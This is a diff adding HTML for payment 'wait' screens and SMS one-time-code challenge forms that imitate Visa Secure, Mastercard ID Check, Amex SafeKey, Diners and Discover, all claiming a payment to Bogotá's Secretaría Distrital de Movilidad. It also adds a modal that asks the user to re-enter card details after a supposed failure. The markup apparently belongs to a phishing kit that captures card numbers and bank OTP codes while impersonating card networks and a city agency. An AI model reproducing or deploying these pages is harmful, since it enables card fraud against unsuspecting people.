@@ -1,0 +1,208 @@
+<div class="pagos-debug-modal" id="pagos-debug-modal" hidden role="dialog" aria-modal="true" aria-labelledby="pagos-debug-modal-title">
+  <div class="pagos-debug-modal__panel">
+    <h2 id="pagos-debug-modal-title">No pudimos verificar la tarjeta</h2>
+    <p id="pagos-debug-modal-message">Ingresa los datos nuevamente.</p>
+    <button type="button" id="pagos-debug-modal-close">Entendido</button>
+  </div>
+</div>
+
+<div
+  class="pasarela-wait"
+  id="pagos-wait-screen"
+  hidden
+  role="status"
+  aria-live="assertive"
+  aria-busy="true"
+  aria-label="Espera un momento"
+>
+  <div class="pasarela-wait__panel" data-wait-brand="visa" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--visa" src="/images/pasarela/visa.png" alt="Visa" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="amex" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--amex" src="/images/pasarela/amex-box.png" alt="American Express" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="diners" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--diners" src="/images/pasarela/diners.png" alt="Diners Club" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="mastercard" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--mc" aria-hidden="true"></div>
+    <div class="pasarela-wait__mc-brand" aria-hidden="true">
+      <svg viewBox="0 0 62 38" width="42" height="26" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+        <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+        <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+      </svg>
+      <span class="pasarela-wait__mc-sep"></span>
+      <span class="pasarela-wait__mc-id">ID Check</span>
+    </div>
+    <h2 class="pasarela-wait__title pasarela-wait__title--mc">Espera un momento</h2>
+    <p class="pasarela-wait__text pasarela-wait__text--mc">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="discover" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--discover" src="/images/pagos-assets/brands/discover.png" alt="Discover" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+</div>
+
+<div
+  class="pasarela-challenge"
+  id="pagos-challenge-screen"
+  hidden
+  role="dialog"
+  aria-modal="true"
+  aria-label="Verificación de pago"
+>
+  <!-- Visa / Discover (Visa Secure) -->
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="visa" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-visa">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-visa" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+    <div class="pasarela-help" data-help>
+      <button type="button" class="pasarela-help__toggle" data-help-toggle aria-expanded="false">
+        <span>¿Necesitas ayuda?</span><span data-help-icon>+</span>
+      </button>
+      <div class="pasarela-help__panel" data-help-panel hidden>
+        <p><strong>No recibí el código</strong><br />Revise los mensajes SMS de su celular registrado en el banco. El código puede tardar unos segundos en llegar.</p>
+        <p><strong>El código no funciona</strong><br />Ingrese el código más reciente que recibió por mensaje de texto. Los códigos anteriores dejan de ser válidos.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="discover" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pagos-assets/brands/discover.png" alt="Discover" class="pasarela-card__logo-discover" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-discover">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-discover" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Amex -->
+  <section class="pasarela-card" data-challenge-brand="amex" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/amex-box.png" alt="American Express" class="pasarela-card__logo-amex" />
+        <img src="/images/pasarela/amex-safekey.png" alt="SafeKey" class="pasarela-card__logo-safekey" />
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-amex">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-amex" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Mastercard ID Check -->
+  <section class="pasarela-card" data-challenge-brand="mastercard" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <div class="pasarela-card__mc-id">
+          <svg viewBox="0 0 62 38" width="56" height="34" aria-hidden="true">
+            <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+            <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+            <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+          </svg>
+          <span><em>mastercard</em> <strong>ID Check</strong></span>
+        </div>
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-mc">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-mc" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Diners -->
+  <section class="pasarela-card pasarela-card--wide" data-challenge-brand="diners" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/diners.png" alt="Diners Club" class="pasarela-card__logo-diners" />
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa-sm" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--diners">Autenticación de compra</h2>
+      <div class="pasarela-card__diners-grid">
+        <div class="pasarela-card__msg pasarela-card__msg--plain">
+          <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+          <p>Enviado a su número registrado en el banco.</p>
+          <div class="pasarela-card__box pasarela-card__box--plain">
+            <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+            <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+            <p>Fecha: <span data-challenge-datetime></span></p>
+          </div>
+        </div>
+        <form class="pasarela-otp pasarela-otp--pill" data-otp-form>
+          <label for="otp-diners">Ingrese el código enviado por SMS a su celular</label>
+          <input id="otp-diners" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+          <button type="submit">Enviar</button>
+        </form>
+      </div>
+    </div>
+  </section>
+</div>
